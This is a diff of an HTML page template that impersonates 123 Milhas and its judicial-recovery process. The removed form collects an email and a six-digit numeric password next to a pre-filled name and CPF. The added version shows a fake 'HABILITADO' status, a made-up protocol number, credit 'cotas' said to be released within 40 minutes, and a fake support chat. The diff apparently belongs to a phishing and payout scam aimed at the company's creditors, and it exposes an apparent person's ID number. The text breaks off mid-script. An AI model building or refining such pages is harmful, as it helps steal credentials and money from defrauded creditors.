@@ -3,56 +3,35 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-    <title>123 Milhas - Finalizar Habilitação</title>
-
-    <!-- Bootstrap 5 CSS -->
+    <title>123 Milhas - Confirmação de Habilitação</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
-
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-
-    <!-- Google Fonts -->
     <link
       href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Nunito:wght@400;600;700&display=swap"
       rel="stylesheet"
     />
-
-    <!-- SweetAlert2 -->
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
     <style>
-      /* ===== VARIÁVEIS ===== */
       :root {
         --primary-color: #f05929;
         --primary-dark: #d94a1a;
-        --primary-light: #ff8c5a;
-        --secondary-color: #ff6b35;
         --success-color: #28a745;
-        --warning-color: #ffc107;
-        --danger-color: #dc3545;
         --text-dark: #2c3e50;
         --text-light: #6c757d;
         --bg-light: #f8f9fa;
         --border-color: #e9ecef;
         --white: #ffffff;
-        --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.05);
-        --shadow-md: 0 5px 20px rgba(0, 0, 0, 0.08);
       }
-
       * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
       }
-
       body {
         font-family: 'Montserrat', 'Nunito', sans-serif;
         background: linear-gradient(135deg, #fff5f0 0%, #ffffff 50%, #fff5f0 100%);
         min-height: 100vh;
         color: var(--text-dark);
       }
-
-      /* ===== MAIN CONTAINER ===== */
       .main-container {
         max-width: 1200px;
         margin: 0 auto;
@@ -61,211 +40,324 @@
         display: flex;
         flex-direction: column;
       }
-
-      /* ===== CARD PRINCIPAL ===== */
       .rj-card {
         background: var(--white);
         border-radius: 32px;
-        box-shadow: var(--shadow-md);
+        box-shadow:
+          0 20px 40px rgba(0, 0, 0, 0.08),
+          0 5px 15px rgba(0, 0, 0, 0.05);
         overflow: hidden;
-        max-width: 580px;
+        max-width: 680px;
         margin: 0 auto;
         width: 100%;
         transition: transform 0.3s ease;
       }
-
       .rj-card:hover {
         transform: translateY(-4px);
       }
-
-      /* Header do card */
       .card-header-rj {
         background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
-        padding: 1.8rem 2rem 1.5rem;
+        padding: 2rem 2rem 1.5rem;
         text-align: center;
         color: white;
       }
-
       .card-header-rj h1 {
-        font-size: 1.5rem;
+        font-size: 2rem;
         font-weight: 800;
         margin-bottom: 0.25rem;
         letter-spacing: -0.5px;
       }
-
-      .card-header-rj p {
-        font-size: 0.8rem;
-        opacity: 0.9;
-        margin: 0;
-      }
-
-      .security-badge {
-        display: inline-flex;
-        align-items: center;
-        gap: 0.5rem;
+      .status-badge {
+        display: inline-block;
         background: rgba(255, 255, 255, 0.2);
         backdrop-filter: blur(10px);
-        padding: 0.4rem 1rem;
+        padding: 0.5rem 1.5rem;
         border-radius: 50px;
-        margin-top: 0.8rem;
-        font-size: 0.7rem;
-        font-weight: 600;
-      }
-
-      /* Corpo do card */
-      .card-body-rj {
-        padding: 1.8rem;
-      }
-
-      /* Formulário */
-      .form-group {
-        margin-bottom: 1.2rem;
-      }
-
-      .form-label {
-        font-size: 0.7rem;
+        margin-top: 1rem;
         font-weight: 700;
+        font-size: 1rem;
+        letter-spacing: 1px;
+      }
+      .status-badge i {
+        margin-right: 0.5rem;
+      }
+      .card-body-rj {
+        padding: 2rem;
+      }
+      .protocolo-box {
+        background: linear-gradient(135deg, var(--bg-light) 0%, #ffffff 100%);
+        border-radius: 20px;
+        padding: 1.2rem;
+        margin-bottom: 1.5rem;
+        text-align: center;
+        border: 1px solid var(--border-color);
+      }
+      .protocolo-label {
+        font-size: 0.7rem;
         text-transform: uppercase;
-        letter-spacing: 0.5px;
+        letter-spacing: 1px;
         color: var(--text-light);
-        margin-bottom: 0.3rem;
+        margin-bottom: 0.25rem;
+      }
+      .protocolo-number {
+        font-size: 1rem;
+        font-weight: 700;
+        color: var(--primary-color);
+        font-family: monospace;
+      }
+      .beneficiario-box {
+        background: var(--white);
+        border-radius: 20px;
+        padding: 1.2rem;
+        margin-bottom: 1.5rem;
+        border: 1px solid var(--border-color);
+      }
+      .section-title {
+        font-size: 0.75rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        color: var(--text-light);
+        margin-bottom: 1rem;
         display: flex;
         align-items: center;
         gap: 0.5rem;
       }
-
-      .form-label i {
+      .section-title i {
         color: var(--primary-color);
-        font-size: 0.8rem;
       }
-
-      .required-star {
-        color: var(--danger-color);
-        font-size: 0.8rem;
+      .beneficiario-nome {
+        font-size: 1.1rem;
+        font-weight: 700;
+        color: var(--text-dark);
+        margin-bottom: 0.5rem;
       }
-
-      .form-control-custom {
-        width: 100%;
-        padding: 0.9rem 1rem;
-        font-size: 0.9rem;
-        border: 1.5px solid var(--border-color);
-        border-radius: 16px;
-        transition: all 0.3s ease;
-        font-family: inherit;
-        background: var(--white);
+      .beneficiario-detalhes {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 1rem;
+        margin-top: 0.5rem;
       }
-
-      .form-control-custom:focus {
-        outline: none;
-        border-color: var(--primary-color);
-        box-shadow: 0 0 0 3px rgba(240, 89, 41, 0.1);
+      .detalhe-item {
+        background: var(--bg-light);
+        padding: 0.3rem 0.8rem;
+        border-radius: 20px;
+        font-size: 0.75rem;
+        font-weight: 600;
       }
-
-      .form-control-custom.input-error {
-        border-color: var(--danger-color);
+      .detalhe-item i {
+        margin-right: 0.3rem;
+        color: var(--primary-color);
       }
-
-      /* Campo de senha com toggle */
-      .password-wrapper {
-        position: relative;
+      .valores-box {
+        background: linear-gradient(135deg, #fff8f5 0%, #ffffff 100%);
+        border-radius: 20px;
+        padding: 1.2rem;
+        margin-bottom: 1.5rem;
+        border-left: 4px solid var(--primary-color);
       }
-
-      .password-toggle {
-        position: absolute;
-        right: 15px;
-        top: 50%;
-        transform: translateY(-50%);
-        cursor: pointer;
+      .valor-total {
+        margin-bottom: 1rem;
+        padding-bottom: 1rem;
+        border-bottom: 1px dashed var(--border-color);
+      }
+      .valor-label {
+        font-size: 0.7rem;
+        text-transform: uppercase;
         color: var(--text-light);
-        background: none;
-        border: none;
+        margin-bottom: 0.25rem;
+      }
+      .valor-number {
+        font-size: 1.6rem;
+        font-weight: 800;
+        color: var(--text-dark);
+      }
+      .cotas-container {
+        margin: 1rem 0;
+      }
+      .cotas-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: baseline;
+        margin-bottom: 0.8rem;
+        flex-wrap: wrap;
+        gap: 0.5rem;
+      }
+      .cotas-title {
+        font-size: 0.75rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        color: var(--primary-color);
+      }
+      .cotas-badge {
+        background: var(--primary-color);
+        color: white;
+        padding: 0.2rem 0.7rem;
+        border-radius: 20px;
+        font-size: 0.7rem;
+        font-weight: 600;
+      }
+      .cotas-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+        gap: 0.8rem;
+        margin-bottom: 1rem;
+      }
+      .cota-card {
+        background: var(--bg-light);
+        border-radius: 16px;
+        padding: 0.8rem;
+        text-align: center;
+        transition: all 0.3s ease;
+      }
+      .cota-card.liberada {
+        background: linear-gradient(135deg, #d4edda 0%, #e8f5e9 100%);
+        border: 1px solid var(--success-color);
+      }
+      .cota-card.pendente {
+        background: var(--white);
+        border: 1px solid var(--border-color);
+        opacity: 0.7;
+      }
+      .cota-numero {
+        font-size: 0.7rem;
+        font-weight: 600;
+        color: var(--text-light);
+        margin-bottom: 0.3rem;
+      }
+      .cota-valor {
+        font-size: 1rem;
+        font-weight: 800;
+        color: var(--text-dark);
+      }
+      .cota-status {
+        font-size: 0.65rem;
+        margin-top: 0.3rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.2rem;
+      }
+      .cota-card.liberada .cota-valor {
+        color: var(--success-color);
+      }
+      .cota-liberada-atual {
+        background: linear-gradient(135deg, #d4edda 0%, #e8f5e9 100%);
+        border-radius: 16px;
+        padding: 1rem;
+        margin-top: 0.5rem;
+      }
+      .cota-label {
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        color: var(--success-color);
+        font-weight: 700;
+      }
+      .cota-number {
+        font-size: 1.4rem;
+        font-weight: 800;
+        color: var(--success-color);
+      }
+      .prazo-box {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        margin-top: 1rem;
+        padding: 0.8rem;
+        background: var(--bg-light);
+        border-radius: 16px;
+      }
+      .prazo-icon {
+        width: 40px;
+        height: 40px;
+        background: var(--primary-color);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 1.2rem;
+      }
+      .prazo-text {
+        flex: 1;
+      }
+      .prazo-text strong {
+        color: var(--primary-color);
         font-size: 1rem;
       }
-
-      .password-toggle:hover {
-        color: var(--primary-color);
+      .prazo-text p {
+        margin: 0;
+        font-size: 0.8rem;
+        color: var(--text-light);
       }
-
-      /* Botão Confirmar */
       .btn-confirmar {
-        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
+        background: linear-gradient(135deg, var(--success-color) 0%, #218838 100%);
         border: none;
         padding: 1rem;
-        font-size: 1rem;
+        font-size: 1.1rem;
         font-weight: 700;
         border-radius: 50px;
         width: 100%;
         color: white;
         transition: all 0.3s ease;
-        box-shadow: 0 4px 12px rgba(240, 89, 41, 0.3);
+        box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
         display: flex;
         align-items: center;
         justify-content: center;
         gap: 0.75rem;
-        margin-top: 0.5rem;
+        cursor: pointer;
       }
-
       .btn-confirmar:hover {
         transform: translateY(-2px);
-        box-shadow: 0 8px 20px rgba(240, 89, 41, 0.4);
-        background: var(--primary-dark);
+        box-shadow: 0 8px 20px rgba(40, 167, 69, 0.4);
+        background: #218838;
       }
-
-      .btn-confirmar:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-        transform: none;
-      }
-
-      /* LGPD Footer */
-      .lgpd-footer {
-        margin-top: 1.2rem;
-        padding-top: 1rem;
+      .info-footer {
+        margin-top: 1.5rem;
         text-align: center;
-        border-top: 1px solid var(--border-color);
-        font-size: 0.65rem;
+        font-size: 0.7rem;
         color: var(--text-light);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 0.5rem;
-        flex-wrap: wrap;
       }
-
-      .lgpd-footer i {
+      .error-no-cache {
+        text-align: center;
+        padding: 3rem 2rem;
+      }
+      .error-no-cache i {
+        font-size: 4rem;
         color: var(--primary-color);
+        margin-bottom: 1rem;
       }
-
-      /* Toast de erro/sucesso */
-      .toast-message {
+      .error-no-cache h3 {
+        color: var(--text-dark);
+        margin-bottom: 0.5rem;
+      }
+      .error-no-cache p {
+        color: var(--text-light);
+        margin-bottom: 1.5rem;
+      }
+      .error-no-cache .btn-voltar {
+        background: var(--primary-color);
+        color: white;
+        border: none;
+        padding: 0.8rem 1.5rem;
+        border-radius: 50px;
+        cursor: pointer;
+        font-weight: 600;
+      }
+      .toast-success {
         position: fixed;
         bottom: 30px;
         left: 50%;
         transform: translateX(-50%);
-        padding: 1rem 1.5rem;
+        background: var(--success-color);
+        color: white;
+        padding: 1rem 2rem;
         border-radius: 50px;
         font-weight: 600;
         z-index: 2000;
         animation: slideUp 0.3s ease;
         box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-        display: flex;
-        align-items: center;
-        gap: 0.5rem;
-      }
-
-      .toast-success {
-        background: var(--success-color);
-        color: white;
         width: 90% !important;
       }
-
-      .toast-error {
-        background: var(--danger-color);
-        color: white;
-        width: 90% !important;
-      }
-
-      /* Loading spinner */
       .loading-spinner {
         display: inline-block;
         width: 20px;
@@ -276,13 +368,11 @@
         animation: spin 0.8s linear infinite;
         margin-right: 8px;
       }
-
       @keyframes spin {
         to {
           transform: rotate(360deg);
         }
       }
-
       @keyframes slideUp {
         from {
           opacity: 0;
@@ -293,8 +383,12 @@
           transform: translateX(-50%) translateY(0);
         }
       }
-
-      /* ===== BOTÃO FLUTUANTE DO CHAT ===== */
+      .logo {
+        position: relative;
+        left: 10px;
+        top: 10px;
+      }
+      /* ── CHAT ── */
       .chat-btn-custom {
         position: fixed !important;
         bottom: 30px !important;
@@ -306,24 +400,15 @@
         border: none !important;
         cursor: pointer !important;
         box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2) !important;
-        transition: all 0.3s ease !important;
         z-index: 1000 !important;
         display: flex !important;
         align-items: center !important;
         justify-content: center !important;
       }
-
-      .chat-btn-custom:hover {
-        transform: scale(1.1) !important;
-        box-shadow: 0 8px 25px rgba(240, 89, 41, 0.4) !important;
-      }
-
       .chat-btn-custom i {
         font-size: 1.8rem !important;
         color: white !important;
       }
-
-      /* ===== MODAL DO CHAT ===== */
       .chat-modal-custom {
         position: fixed !important;
         bottom: 100px !important;
@@ -332,31 +417,15 @@
         max-width: calc(100vw - 60px) !important;
         background: white !important;
         border-radius: 20px !important;
-        box-shadow:
-          0 20px 40px rgba(0, 0, 0, 0.2),
-          0 5px 15px rgba(0, 0, 0, 0.1) !important;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2) !important;
         z-index: 1001 !important;
         display: none !important;
         flex-direction: column !important;
         overflow: hidden !important;
-        animation: slideUpChat 0.3s ease !important;
       }
-
-      @keyframes slideUpChat {
-        from {
-          opacity: 0;
-          transform: translateY(20px);
-        }
-        to {
-          opacity: 1;
-          transform: translateY(0);
-        }
-      }
-
       .chat-modal-custom.active {
         display: flex !important;
       }
-
       .chat-modal-header {
         background: linear-gradient(135deg, var(--primary-color) 0%, #d94a1a 100%) !important;
         color: white !important;
@@ -365,7 +434,6 @@
         align-items: center !important;
         gap: 12px !important;
       }
-
       .chat-modal-logo {
         width: 40px !important;
         height: 40px !important;
@@ -374,50 +442,33 @@
         display: flex !important;
         align-items: center !important;
         justify-content: center !important;
-        padding: 8px !important;
       }
-
       .chat-modal-logo img {
-        width: 100% !important;
-        height: auto !important;
+        width: 30px !important;
+        height: 30px !important;
         object-fit: contain !important;
+        border-radius: 8px !important;
       }
-
       .chat-modal-title {
         flex: 1 !important;
       }
-
       .chat-modal-title h4 {
         margin: 0 !important;
         font-size: 1rem !important;
         font-weight: 700 !important;
       }
-
       .chat-modal-title p {
         margin: 0 !important;
         font-size: 0.7rem !important;
         opacity: 0.9 !important;
       }
-
       .chat-modal-close {
         background: none !important;
         border: none !important;
         color: white !important;
         font-size: 1.2rem !important;
         cursor: pointer !important;
-        width: 30px !important;
-        height: 30px !important;
-        border-radius: 50% !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        transition: all 0.2s ease !important;
       }
-
-      .chat-modal-close:hover {
-        background: rgba(255, 255, 255, 0.2) !important;
-      }
-
       .chat-modal-body {
         flex: 1 !important;
         height: 400px !important;
@@ -425,7 +476,6 @@
         flex-direction: column !important;
         background: #f5f7fa !important;
       }
-
       .chat-modal-messages {
         flex: 1 !important;
         overflow-y: auto !important;
@@ -434,45 +484,34 @@
         flex-direction: column !important;
         gap: 10px !important;
       }
-
       .message-bubble {
         max-width: 85% !important;
         padding: 10px 14px !important;
         border-radius: 18px !important;
         font-size: 0.85rem !important;
-        line-height: 1.4 !important;
-        word-wrap: break-word !important;
       }
-
       .message-bubble.system {
         background: #e9ecef !important;
         color: #495057 !important;
         align-self: flex-start !important;
-        border-bottom-left-radius: 4px !important;
       }
-
       .message-bubble.user {
         background: var(--primary-color) !important;
         color: white !important;
         align-self: flex-end !important;
-        border-bottom-right-radius: 4px !important;
       }
-
       .message-bubble.operator {
         background: white !important;
         color: var(--text-dark) !important;
         align-self: flex-start !important;
         border: 1px solid #e0e0e0 !important;
-        border-bottom-left-radius: 4px !important;
       }
-
       .message-time {
         font-size: 0.65rem !important;
         opacity: 0.7 !important;
         margin-top: 4px !important;
         display: block !important;
       }
-
       .chat-modal-input-area {
         padding: 15px !important;
         background: white !important;
@@ -480,7 +519,6 @@
         display: flex !important;
         gap: 10px !important;
       }
-
       .chat-modal-input-area input {
         flex: 1 !important;
         padding: 12px 15px !important;
@@ -488,14 +526,11 @@
         border-radius: 25px !important;
         font-size: 0.85rem !important;
         outline: none !important;
-        transition: all 0.2s ease !important;
+        font-family: inherit !important;
       }
-
       .chat-modal-input-area input:focus {
         border-color: var(--primary-color) !important;
-        box-shadow: 0 0 0 2px rgba(240, 89, 41, 0.2) !important;
       }
-
       .chat-modal-input-area button {
         background: var(--primary-color) !important;
         border: none !important;
@@ -503,18 +538,9 @@
         width: 40px !important;
         height: 40px !important;
         border-radius: 50% !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
         cursor: pointer !important;
-        transition: all 0.2s ease !important;
+        flex-shrink: 0 !important;
       }
-
-      .chat-modal-input-area button:hover {
-        background: #d94a1a !important;
-        transform: scale(1.05) !important;
-      }
-
       .chat-online-indicator {
         display: inline-block !important;
         width: 8px !important;
@@ -524,7 +550,6 @@
         margin-left: 8px !important;
         animation: pulse 1.5s infinite !important;
       }
-
       @keyframes pulse {
         0% {
           transform: scale(0.8);
@@ -535,51 +560,32 @@
           opacity: 0;
         }
       }
-
-      /* ===== RESPONSIVIDADE ===== */
       @media (max-width: 768px) {
         .main-container {
           padding: 1.5rem 1rem;
         }
-
         .card-header-rj h1 {
+          font-size: 1.5rem;
+        }
+        .valor-number {
           font-size: 1.3rem;
         }
-
+        .cotas-grid {
+          grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
+        }
+      }
+      @media (max-width: 480px) {
         .card-body-rj {
           padding: 1.5rem;
         }
-
-        .chat-modal-custom {
-          bottom: 80px !important;
-          right: 10px !important;
-          left: 10px !important;
-          width: auto !important;
-          max-width: none !important;
-          height: 70vh !important;
+        .beneficiario-detalhes {
+          flex-direction: column;
+          gap: 0.5rem;
         }
-
-        .chat-modal-body {
-          height: calc(70vh - 70px) !important;
+        .prazo-box {
+          flex-direction: column;
+          text-align: center;
         }
-      }
-
-      @media (max-width: 480px) {
-        .btn-confirmar {
-          font-size: 0.9rem;
-          padding: 0.9rem;
-        }
-      }
-
-      @media (min-width: 769px) and (max-width: 1024px) {
-        .rj-card {
-          max-width: 550px;
-        }
-      }
-      .logo {
-        position: relative;
-        left: 10px;
-        top: 10px;
       }
     </style>
   </head>
@@ -588,108 +594,20 @@
       <img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" class="logo" />
     </div>
     <div class="main-container">
-      <!-- CARD PRINCIPAL - FINALIZAR HABILITAÇÃO -->
-      <div class="rj-card">
+      <div class="rj-card" id="mainCard">
         <div class="card-header-rj">
-          <h1>FINALIZAR HABILITAÇÃO</h1>
-          <p>SEGURANÇA DE DADOS JUDICIAL</p>
-          <div class="security-badge"><i class="fas fa-shield-alt"></i> AMBIENTE SEGURO</div>
+          <h1>Recuperação judicial</h1>
+          <div class="status-badge"><i class="fas fa-check-circle"></i> HABILITADO</div>
         </div>
-        <div class="card-body-rj">
-          <form
-            id="habilitacaoForm"
-            onsubmit="
-              event.preventDefault()
-              processarCadastro()
-            "
-          >
-            <!-- Nome completo (pré-preenchido) -->
-            <div class="form-group">
-              <div class="form-label">
-                <i class="fas fa-user"></i> NOME COMPLETO
-                <span class="required-star">*</span>
-              </div>
-              <input
-                type="text"
-                class="form-control-custom"
-                id="nomeCompleto"
-                value="VANDERLUCIAROSA CUNHA"
-                readonly
-                style="background-color: #f8f9fa; cursor: not-allowed"
-              />
-            </div>
-
-            <!-- CPF (pré-preenchido) -->
-            <div class="form-group">
-              <div class="form-label">
-                <i class="fas fa-id-card"></i> CPF DO TITULAR
-                <span class="required-star">*</span>
-              </div>
-              <input
-                type="text"
-                class="form-control-custom"
-                id="cpf"
-                value="591.873.449-04"
-                readonly
-                style="background-color: #f8f9fa; cursor: not-allowed"
-              />
-            </div>
-
-            <!-- E-mail para notificações -->
-            <div class="form-group">
-              <div class="form-label">
-                <i class="fas fa-envelope"></i> E-MAIL PARA NOTIFICAÇÕES
-                <span class="required-star">*</span>
-              </div>
-              <input type="email" class="form-control-custom" id="email" placeholder="seu@email.com" value="menesesteste@gmail.com" />
-            </div>
-
-            <!-- Senha de acesso -->
-            <div class="form-group">
-              <div class="form-label">
-                <i class="fas fa-lock"></i> SENHA DE ACESSO
-                <span class="required-star">*</span>
-              </div>
-              <div class="password-wrapper">
-                <input type="password" class="form-control-custom" id="senha" placeholder="Digite sua senha" />
-                <button type="button" class="password-toggle" onclick="togglePassword('senha')">
-                  <i class="fas fa-eye-slash"></i>
-                </button>
-              </div>
-            </div>
-
-            <!-- Confirmar senha -->
-            <div class="form-group">
-              <div class="form-label">
-                <i class="fas fa-lock"></i> CONFIRMAR SENHA
-                <span class="required-star">*</span>
-              </div>
-              <div class="password-wrapper">
-                <input type="password" class="form-control-custom" id="confirmarSenha" placeholder="Confirme sua senha" />
-                <button type="button" class="password-toggle" onclick="togglePassword('confirmarSenha')">
-                  <i class="fas fa-eye-slash"></i>
-                </button>
-              </div>
-            </div>
-
-            <button type="submit" class="btn-confirmar" id="btnConfirmar"><i class="fas fa-check-double"></i> CONFIRMAR CADASTRO</button>
-          </form>
-
-          <div class="lgpd-footer">
-            <i class="fas fa-shield-alt"></i>
-            Seus dados estão protegidos pela Lei Geral de Proteção de Dados (LGPD).
-          </div>
-        </div>
+        <div class="card-body-rj" id="cardBody"></div>
       </div>
     </div>
 
-    <!-- BOTÃO FLUTUANTE DO CHAT -->
-    <button class="chat-btn-custom" onclick="abrirChatCustom()">
+    <button class="chat-btn-custom" onclick="abrirChat()">
       <i class="fas fa-comment-dots"></i>
     </button>
 
-    <!-- MODAL DO CHAT -->
-    <div id="chatModalCustom" class="chat-modal-custom">
+    <div id="chatModal" class="chat-modal-custom">
       <div class="chat-modal-header">
         <div class="chat-modal-logo">
           <img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" />
@@ -698,10 +616,10 @@
           <h4>Atendimento 123 Milhas <span class="chat-online-indicator"></span></h4>
           <p>Online - Respondemos em instantes</p>
         </div>
-        <button class="chat-modal-close" onclick="fecharChatCustom()">✕</button>
+        <button class="chat-modal-close" onclick="fecharChat()">✕</button>
       </div>
       <div class="chat-modal-body">
-        <div class="chat-modal-messages" id="chatMessagesCustom">
+        <div class="chat-modal-messages" id="chatMessages">
           <div class="message-bubble system">
             <strong>👋 Olá!</strong><br />
             Bem-vindo ao canal de atendimento da 123 Milhas.<br />
@@ -710,407 +628,268 @@
           </div>
         </div>
         <div class="chat-modal-input-area">
-          <input
-            type="text"
-            id="chatInputCustom"
-            placeholder="Digite sua mensagem..."
-            onkeypress="if (event.key === 'Enter') enviarMensagemCustom()"
-          />
-          <button onclick="enviarMensagemCustom()">
-            <i class="fas fa-paper-plane"></i>
-          </button>
+          <input type="text" id="chatInput" placeholder="Digite sua mensagem..." />
+          <button onclick="enviarMensagem()"><i class="fas fa-paper-plane"></i></button>
         </div>
       </div>
     </div>
 
     <script>
-      // ===== CONTROLE DO MODAL DA SENHA =====
-      let modalSenhaJaMostrado = false
+      // ===== DADOS DA PÁGINA =====
+      const STORAGE_KEYS = { CREDOR_DATA: 'credorData', USER_NAME: 'chatUserName' }
+      let credorData = null
 
-      // Função para permitir apenas números e limitar a 6 dígitos
-      function apenasNumeros(input) {
-        input.value = input.value.replace(/[^0-9]/g, '').slice(0, 6)
+      function formatarCPFExibicao(cpf) {
+        if (!cpf) return '---'
+        const c = String(cpf).replace(/\D/g, '')
+        return c.length === 11 ? c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : cpf
       }
 
-      // Função para alternar visibilidade da senha
-      function togglePassword(fieldId) {
-        const field = document.getElementById(fieldId)
-        const btn = field.parentElement.querySelector('.password-toggle i')
-        if (field.type === 'password') {
-          field.type = 'text'
-          btn.classList.remove('fa-eye-slash')
-          btn.classList.add('fa-eye')
-        } else {
-          field.type = 'password'
-          btn.classList.remove('fa-eye')
-          btn.classList.add('fa-eye-slash')
+      function mostrarErroSemCache() {
+        document.getElementById('cardBody').innerHTML = `
+          <div class="error-no-cache">
+            <i class="fas fa-exclamation-triangle"></i>
+            <h3>Nenhum dado encontrado</h3>
+            <p>Você precisa primeiro consultar seu CPF na página inicial.</p>
+            <button class="btn-voltar" onclick="window.location.href='/'"><i class="fas fa-arrow-left"></i> Voltar para consulta</button>
+          </div>`
+      }
+
+      function calcularCotas(valorTotal) {
+        const n = valorTotal > 20000 ? 4 : 2
+        const v = valorTotal / n
+        return {
+          numeroCotas: n,
+          valorCota: v,
+          cota01: v,
+          cotas: Array(n)
+            .fill()
+            .map((_, i) => ({ numero: i + 1, valor: v, liberada: i === 0, percentual: ((v / valorTotal) * 100).toFixed(1) }))
         }
       }
 
-      // ===== MODAL SÓ MOSTRA UMA VEZ QUANDO O CAMPO ESTÁ VAZIO =====
-      const senhaInput = document.getElementById('senha')
-
-      senhaInput.addEventListener('focus', function () {
-        // Só mostra se ainda não foi mostrado E o campo está vazio
-        if (!modalSenhaJaMostrado && this.value.length === 0) {
-          modalSenhaJaMostrado = true
-
-          Swal.fire({
-            title: '<i class="fas fa-lock"></i> Regras da Senha',
-            html: `
-              <div style="text-align: left;">
-                <p><strong>Sua senha deve:</strong></p>
-                <ul style="list-style: none; padding-left: 0;">
-                  <li><i class="fas fa-check-circle" style="color: #4CAF50;"></i> Ter exatamente <strong>6 dígitos numéricos</strong></li>
-                  <li><i class="fas fa-ban" style="color: #f44336;"></i> Não aceita letras ou caracteres especiais</li>
-                </ul>
-                <div style="background: #f0f0f0; padding: 10px; border-radius: 5px; margin-top: 10px;">
-                  <i class="fas fa-info-circle"></i> Exemplo: <strong>123456</strong>
-                </div>
-              </div>
-            `,
-            icon: 'info',
-            confirmButtonText: 'Entendi',
-            confirmButtonColor: '#3085d6',
-            backdrop: true,
-            allowOutsideClick: false
-          })
+      function renderizarCard() {
+        if (!credorData) {
+          mostrarErroSemCache()
+          return
         }
-      })
-
-      // Validar enquanto digita (apenas números)
-      senhaInput.addEventListener('input', function (e) {
-        apenasNumeros(this)
-
-        // Feedback visual quando chegar a 6 dígitos
-        if (this.value.length === 6) {
-          this.style.borderColor = '#4CAF50'
-          this.style.borderWidth = '2px'
-        } else {
-          this.style.borderColor = '#ddd'
-          this.style.borderWidth = '1.5px'
-        }
-      })
-
-      // Validação ao perder o foco
-      senhaInput.addEventListener('blur', function () {
-        if (this.value.length > 0 && this.value.length !== 6) {
-          Swal.fire({
-            title: '⚠️ Atenção!',
-            text: `A senha deve ter exatamente 6 dígitos. Você digitou ${this.value.length} dígito(s).`,
-            icon: 'warning',
-            confirmButtonText: 'Corrigir',
-            confirmButtonColor: '#ff9800'
-          })
-          this.focus()
-        }
-      })
-
-      // ===== CHAVES DO CACHE =====
-      const STORAGE_KEYS = {
-        CREDOR_DATA: 'credorData',
-        USER_HABILITACAO: 'userHabilitacao',
-        USER_NAME: 'chatUserName'
+        const ci = calcularCotas(credorData.creditoTotal)
+        const vTot = credorData.creditoTotal.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+        const vCota = ci.cota01.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+        const cotasHTML = ci.cotas
+          .map(
+            (c) => `
+          <div class="cota-card ${c.liberada ? 'liberada' : 'pendente'}">
+            <div class="cota-numero">${c.percentual}% • COTA ${c.numero}</div>
+            <div class="cota-valor">R$ ${c.valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</div>
+            <div class="cota-status">${c.liberada ? '<i class="fas fa-check-circle"></i> Liberada' : '<i class="fas fa-clock"></i> Aguardando'}</div>
+          </div>`
+          )
+          .join('')
+        document.getElementById('cardBody').innerHTML = `
+          <div class="protocolo-box"><div class="protocolo-label"><i class="fas fa-gavel"></i> PROTOCOLO JUDICIAL</div><div class="protocolo-number">${credorData.protocolo || 'RJ-123-502.943/2024'}</div></div>
+          <div class="beneficiario-box"><div class="section-title"><i class="fas fa-user-check"></i> BENEFICIÁRIO</div><div class="beneficiario-nome">${credorData.nome}</div><div class="beneficiario-detalhes"><span class="detalhe-item"><i class="fas fa-id-card"></i> ${formatarCPFExibicao(credorData.cpf)}</span><span class="detalhe-item"><i class="fas fa-chart-line"></i> ${credorData.classe || 'QUIROGRAFÁRIO'}</span></div></div>
+          <div class="valores-box"><div class="valor-total"><div class="valor-label"><i class="fas fa-coins"></i> CRÉDITO TOTAL HABILITADO</div><div class="valor-number">R$ ${vTot}</div></div><div class="cotas-container"><div class="cotas-header"><span class="cotas-title"><i class="fas fa-chart-pie"></i> SISTEMA DE PAGAMENTO</span><span class="cotas-badge">${ci.numeroCotas} COTAS ${ci.numeroCotas === 4 ? '(20% cada)' : '(50% cada)'}</span></div><div class="cotas-grid">${cotasHTML}</div></div><div class="cota-liberada-atual"><div class="cota-label"><i class="fas fa-hand-holding-usd"></i> COTA 01 LIBERADA</div><div class="cota-number">R$ ${vCota}</div><div class="prazo-box"><div class="prazo-icon"><i class="fas fa-clock"></i></div><div class="prazo-text"><strong>Prazo de recebimento:</strong><p>em até 40 minutos após confirmação</p></div></div></div></div>
+          <button class="btn-confirmar" id="btnConfirmar" onclick="confirmarSolicitacao()"><i class="fas fa-check-double"></i> CONFIRMAR SOLICITAÇÃO</button>
